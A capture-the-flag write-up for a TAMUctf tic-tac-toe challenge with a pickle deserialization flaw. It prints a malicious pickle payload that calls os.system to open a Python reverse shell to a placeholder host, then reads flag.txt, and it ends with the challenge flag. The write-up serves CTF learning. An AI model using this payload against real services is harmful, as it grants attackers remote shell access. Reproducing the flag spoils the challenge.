# tic tac toe

Hey, I made a new game!  If you can beat me enough times I'll give you a flag. 

`nc challenges.tamuctf.com 9397`

(provide game.py)

## (very brief) dev description

its a pickle RCE vuln

## solution

HEADS UP: you've found a *secret* **special** writeup that wouldn't work in the actual competition due to firewall
constraints. The specific payload used here doesn't work because it requires a reverse shell, which wasn't possible from
this particular challenge during the competition. However, a solving script which does not rely on this behaviour is
provided in [solve.py](solve.py), which was tested on infrastructure during the competition -- just in case. :)

-----

Manual inspection of the `game.py` provided clearly indicates improper use of the [pickle library](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#whitebox-review_1).

I have but one pickle payload that I throw at [literally everything pickle-y](https://addisoncrump.info/security/ctfs/smc3/wx01/).

```
cos
system
(S'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HAHA-NO-IP-FOR-YOU",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
tR.
```

This spawns a reverse shell back to whatever target I like. Then, I simply execute `cat flag.txt` once I have the shell.

The solution provided by Teddy is far more elegant, but this gets the job done.

```
gigem{h3y_7h47_d035n'7_l00k_l1k3_4_p1ckl3d_54v3}
```
